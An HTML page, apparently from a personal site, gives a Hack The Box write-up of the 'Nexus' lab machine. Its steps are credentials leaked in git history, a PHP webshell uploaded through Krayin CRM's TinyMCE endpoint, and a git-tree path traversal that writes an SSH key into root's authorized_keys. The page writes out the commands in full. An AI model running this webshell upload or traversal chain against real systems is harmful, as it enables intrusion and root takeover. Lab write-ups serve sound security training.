@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Nexus — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="Git-history credential leak → TinyMCE unrestricted upload (CVE-2026-38526) → root git-tree path traversal" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23181a1e'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html">arthur<span class="at">@</span>trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / nexus</div>
+      <h1>Nexus</h1>
+      <p class="sub">Hack The Box · <span class="accent">Easy</span> · Linux</p>
+      <div class="meta-tags">
+        <span class="green">Easy</span>
+        <span>Linux</span>
+        <span class="accent">User + Root owned</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<h2>Machine Overview</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Nexus</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Linux (Ubuntu, nginx 1.24.0)</td>
+</tr>
+<tr>
+<td>IP</td>
+<td>10.129.146.171</td>
+</tr>
+<tr>
+<td>Vhosts</td>
+<td><code>nexus.htb</code> (main), <code>git.nexus.htb</code> (Gitea 1.26.0), <code>billing.nexus.htb</code> (Krayin CRM 2.2.0)</td>
+</tr>
+<tr>
+<td>Kernel</td>
+<td>6.8.0-111-generic</td>
+</tr>
+<tr>
+<td>Ports</td>
+<td>22 (SSH / OpenSSH 9.6p1), 80 (nginx)</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Attack surface summary:</strong> A fictional "Nexus Energy Authority" corporate site, plus two internal vhosts — a self-hosted Gitea instance and a Krayin CRM billing portal (Laravel 12). Foothold runs through the CRM; privilege escalation runs through a root systemd timer that syncs Gitea template repositories via an unsanitized <code>os.path.join</code>.</p>
+<h2>Flags</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User (<code>/home/jones/user.txt</code>)</td>
+<td><code>3c2fbdb0251b53802b1c878ef262c826</code></td>
+</tr>
+<tr>
+<td>Root (<code>/root/root.txt</code>)</td>
+<td><code>ba50357ae77edadbc1846498d09d2542</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2>Reconnaissance</h2>
+<pre><code class="language-bash">nmap -p- --min-rate 5000 10.129.146.171
+# 22/tcp open  ssh
+# 80/tcp open  http
+
+nmap -sCV -p 22,80 10.129.146.171
+# 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+# 80/tcp open  http    nginx 1.24.0 (Ubuntu)
+# |_http-title: Did not follow redirect to http://nexus.htb/
+</code></pre>
+<p>The main site redirects to <code>nexus.htb</code>. Virtual-host fuzzing (Host header against the IP) surfaced two real subdomains that differ from the default 302:</p>
+<ul>
+<li><code>git.nexus.htb</code> → <strong>Gitea 1.26.0</strong> (self-hosted Git)</li>
+<li><code>billing.nexus.htb</code> → <strong>Krayin CRM</strong> (redirects to <code>/admin/login</code>)</li>
+</ul>
+<p>Since the Windows attack host can't edit <code>/etc/hosts</code> without admin, all HTTP used <code>curl --resolve</code>, and git used <code>-c http.extraHeader="Host: git.nexus.htb"</code> against the raw IP.</p>
+<hr />
+<h2>Attack Chain</h2>
+<h3>1. Information disclosure — leaked credentials in Gitea git history</h3>
+<p><code>git.nexus.htb</code> exposes a public, unauthenticated repo <code>admin/krayin-docker-setup</code>. Cloning it and reading the commit history reveals an <code>.env</code> whose database password was later redacted:</p>
+<pre><code class="language-bash">git -c http.extraHeader=&quot;Host: git.nexus.htb&quot; clone http://10.129.146.171/admin/krayin-docker-setup.git
+git log -p -- .env
+</code></pre>
+<pre><code class="language-diff"> DB_USERNAME=krayin
+-DB_PASSWORD=N27xh!!2ucY04
++DB_PASSWORD=
+</code></pre>
+<p>The careers page on <code>nexus.htb</code> leaks the hiring manager's email <code>j.matthew@nexus.htb</code> (username format <code>first.last@nexus.htb</code>).</p>
+<h3>2. Krayin CRM admin login (credential reuse)</h3>
+<p>The leaked password <code>N27xh!!2ucY04</code> was reused as the CRM admin's login password:</p>
+<pre><code class="language-bash">curl -c kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: billing.nexus.htb&quot; \
+  http://billing.nexus.htb/admin/login        # extract CSRF _token
+curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: billing.nexus.htb&quot; \
+  -X POST --data-urlencode &quot;_token=$TOKEN&quot; \
+  --data-urlencode &quot;email=j.matthew@nexus.htb&quot; \
+  --data-urlencode &quot;password=N27xh!!2ucY04&quot; \
+  http://billing.nexus.htb/admin/login
+# 302 -&gt; /admin/dashboard  (auth OK)
+</code></pre>
+<p>Dashboard confirms <strong>Krayin CRM 2.2.0</strong>.</p>
+<h3>3. Authenticated RCE — CVE-2026-38526 (TinyMCE unrestricted upload)</h3>
+<p>Krayin 2.2.x is vulnerable to CVE-2026-38526: <code>/admin/tinymce/upload</code> performs no extension/type validation. Upload a PHP webshell (spoofed <code>image/jpeg</code>), then hit the returned URL:</p>
+<pre><code class="language-bash">printf '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
+curl -b kc.txt --resolve billing.nexus.htb:80:10.129.146.171 -H &quot;Host: billing.nexus.htb&quot; \
+  -H &quot;X-XSRF-TOKEN: $XSRF&quot; -F &quot;file=@shell.php;type=image/jpeg;filename=shell.php&quot; \
+  http://billing.nexus.htb/admin/tinymce/upload
+# {&quot;location&quot;:&quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php&quot;}
+
+curl -s &quot;http://billing.nexus.htb/storage/tinymce/bcd55792d8ea17c3446ac47239ea1567.php?cmd=id&quot;
+# uid=33(www-data) gid=33(www-data) ...
+</code></pre>
+<h3>4. <code>.env</code> discovery — rotated DB password</h3>
+<pre><code class="language-bash">curl -s &quot;$WS?cmd=cat%20/var/www/krayin/.env&quot;
+# DB_USERNAME=krayin
+# DB_PASSWORD=y27xb3ha!!74GbR      &lt;-- rotated password, differs from git leak
+</code></pre>
+<h3>5. Password reuse → user shell</h3>
+<p>The rotated DB password <code>y27xb3ha!!74GbR</code> is reused for the system account <code>jones</code>:</p>
+<pre><code class="language-bash">ssh jones@10.129.146.171   # password: y27xb3ha!!74GbR
+cat /home/jones/user.txt
+# 3c2fbdb0251b53802b1c878ef262c826
+</code></pre>
+<h3>6. Privilege escalation — Gitea template-sync path traversal</h3>
+<p><code>systemctl list-timers</code> shows a root oneshot, <code>gitea-template-sync.timer</code>, firing every ~60 s, running <code>/etc/gitea/template-sync.py</code> as root:</p>
+<pre><code class="language-ini"># /etc/systemd/system/gitea-template-sync.service
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+</code></pre>
+<p><code>template-sync.py</code> queries Gitea for repos marked as templates, then for each blob does:</p>
+<pre><code class="language-python">target = os.path.join(stage_path, filepath)   # filepath comes raw from git ls-tree
+</code></pre>
+<p><code>filepath</code> is taken directly from the git tree with no sanitization — a textbook path traversal. As <code>jones</code> (who can log into Gitea with the same password), create a repo, mark it a template, and push a git tree whose blob path is <code>../../../../../../root/.ssh/authorized_keys</code>:</p>
+<pre><code class="language-bash">ssh-keygen -t ed25519 -f nexus_root_key -N &quot;&quot;
+BLOB=$(git hash-object -w nexus_root_key.pub)
+T_SSH=$(printf '100644 blob %s\tauthorized_keys\n' &quot;$BLOB&quot; | git mktree)
+T_DOTSSH=$(printf '040000 tree %s\t.ssh\n' &quot;$T_SSH&quot; | git mktree)
+T_ROOT=$(printf '040000 tree %s\troot\n' &quot;$T_DOTSSH&quot; | git mktree)
+T_UP1=$(printf '040000 tree %s\t..\n' &quot;$T_ROOT&quot; | git mktree)
+T_UP2=$(printf '040000 tree %s\t..\n' &quot;$T_UP1&quot; | git mktree)
+T_UP3=$(printf '040000 tree %s\t..\n' &quot;$T_UP2&quot; | git mktree)
+T_UP4=$(printf '040000 tree %s\t..\n' &quot;$T_UP3&quot; | git mktree)
+T_UP5=$(printf '040000 tree %s\t..\n' &quot;$T_UP4&quot; | git mktree)
+T_TREE=$(printf '040000 tree %s\t..\n' &quot;$T_UP5&quot; | git mktree)
+COMMIT=$(git commit-tree &quot;$T_TREE&quot; -m init)
+git update-ref refs/heads/main &quot;$COMMIT&quot;
+git -c http.extraHeader=&quot;Host: git.nexus.htb&quot; push -f origin main
+</code></pre>
+<p>The next timer tick logs <code>synced: ../../../../../../root/.ssh/authorized_keys</code>, and the public key lands in <code>/root/.ssh/authorized_keys</code>. SSH in as root:</p>
+<pre><code class="language-bash">ssh -i nexus_root_key root@10.129.146.171
+cat /root/root.txt
+# ba50357ae77edadbc1846498d09d2542
+</code></pre>
+<hr />
+<h2>Techniques Demonstrated</h2>
+<ol>
+<li><strong>Virtual-host fuzzing</strong> — Host-header enumeration to discover internal <code>git</code> / <code>billing</code> apps.</li>
+<li><strong>Secrets in git history</strong> — a "redacted" <code>.env</code> still leaks the old DB password via <code>git log -p</code>.</li>
+<li><strong>Credential reuse</strong> — leaked DB password = CRM admin login; rotated DB password = <code>jones</code> SSH.</li>
+<li><strong>Unrestricted file upload (CVE-2026-38526)</strong> — TinyMCE endpoint accepts a <code>.php</code> webshell → <code>www-data</code> RCE.</li>
+<li><strong>Path traversal in a root service</strong> — unsanitized <code>os.path.join</code> on git tree filenames writes an SSH key to <code>/root/.ssh/authorized_keys</code>.</li>
+</ol>
+<h2>Tools Used</h2>
+<p>nmap, curl (<code>--resolve</code> + cookie jar), git (with <code>http.extraHeader</code> Host routing), Python <code>requests</code>/<code>paramiko</code> (SSH key auth), <code>ssh-keygen</code>, <code>git mktree</code>/<code>hash-object</code> plumbing.</p>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
